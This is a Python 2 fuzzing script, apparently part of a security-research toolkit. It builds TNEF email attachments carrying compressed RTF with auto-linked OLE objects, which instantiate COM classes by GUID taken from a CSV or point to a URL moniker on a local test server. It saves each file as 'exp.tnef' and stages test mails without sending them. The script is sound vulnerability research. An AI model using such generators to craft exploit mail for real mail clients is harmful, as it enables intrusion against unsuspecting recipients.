#!/usr/bin/env python
import sys
import _winreg
import pyout
import os
import shutil
from fuzzer.generators import tnef, rtf, mapiprop, officefile
from pyout.enums.mapi import MapiEnum
from fuzzer.generators.ole import moniker, objref


GLOB = {}


def fpath():
    if not GLOB.get('fpath'):
        GLOB['fpath'] = os.path.join(pyout.mypath("mails"), "files")
    return GLOB['fpath']


def getPig(ext):
    return "wb.bin"


def genFile(pig, curfile):
    pig = os.path.join(fpath(), "gen", pig)
    fname = os.path.join(fpath(), "gen", curfile)
    shutil.copyfile(pig, fname)
    return fname


def procExt(ext):
    # genfile
    curfile = "test" + ext
    fullname = genFile(getPig(ext), curfile)
    url = "http://www.local:8080/files/" + curfile
    # urlmon send
    # mp = mapiprop.MapiProps()
    # t = tnef.TNEF().std().messageClass()
    # obj = moniker.UrlMoniker(url)
    # data = officefile.OfficeFile.OLEObject(obj)
    # doc = rtf.RTF()
    # doc.addObject("OfficeDOC", data, objType=rtf.RTF.RtfObject.OBJ_AUTOLINK, embedType=rtf.RTF.RtfObject.EMBED)
    # rtdata = doc.dump()
    # rtdata = rtf.RTFCompressor.compress(rtdata)
    # mp.rtf(rtdata)
    # mp.add(MapiEnum.PR_RTF_SYNC_BODY_CRC, 0)
    # t.mapiProps(mp)
    # with open(os.path.join(fpath(), "exp.tnef"), "wb") as f:
    #     f.write(t.dump())
    # pyout.mail("tnefexp", nosend=True, subj=ext)
    # ooxml send
    pyout.mail("ooxml", nosend=True, subj=ext, curfile=curfile, url=url, pigfile=fullname)


def procTnef(guid, descr):
    mp = mapiprop.MapiProps()
    t = tnef.TNEF().std().messageClass()
    obj = objref.PersistStreamInit(guid)
    data = officefile.OfficeFile.OLEObject(obj)
    doc = rtf.RTF()
    doc.addObject("OfficeDOC", data, objType=rtf.RTF.RtfObject.OBJ_AUTOLINK, embedType=rtf.RTF.RtfObject.EMBED)
    rtdata = doc.dump()
    rtdata = rtf.RTFCompressor.compress(rtdata)
    mp.rtf(rtdata)
    mp.add(MapiEnum.PR_RTF_SYNC_BODY_CRC, 0)
    t.mapiProps(mp)
    with open(os.path.join(fpath(), "exp.tnef"), "wb") as f:
        f.write(t.dump())
    pyout.mail("tnefexp", nosend=True, subj=guid + ' ' + descr)


def main():
    i = 0
    with open("intftest.csv") as f:
        for l in f:
            s = l.split(',')
            if len(s) < 2 or s[0][0] != '"':
                continue
            guid = '{' + s[0].split('"')[1] + '}'
            name = s[1].split('"')[1].strip()
            print guid, name
            procTnef(guid, name)
            i += 1
    print i, "processed"
    return 0


if __name__ == "__main__":
    sys.exit(main())
